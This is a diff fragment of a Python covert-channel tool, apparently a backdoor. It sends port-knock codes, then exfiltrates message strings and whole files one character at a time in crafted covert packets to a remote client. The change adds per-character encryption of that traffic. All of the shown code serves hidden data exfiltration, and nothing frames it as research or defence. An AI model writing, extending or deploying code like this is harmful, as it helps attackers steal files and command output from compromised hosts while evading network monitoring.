@@ -53,7 +53,8 @@ def addWatch(target, address, proto):
 
 def sendMessage(string):
 	recvFunctions.knockCode(client, protocol, True)
-	# encrypt results 
+	
+	string = utils.encryptData(string)
 	for c in string:
 		send(utils.covertPacket(client, protocol, c, recvFunctions.pswd), verbose=0)
 	send(utils.covertPacket(client, protocol, '\n', recvFunctions.pswd), verbose=0)
@@ -72,6 +73,7 @@ def sendFile(target):
 			c = f.read(1)
 			if not c:
 				break
+			c = utils.encryptData(c)
 			send(utils.covertPacket(client, protocol, c, recvFunctions.pswd), verbose=0)
 
 	recvFunctions.knockCode(client, protocol, True)
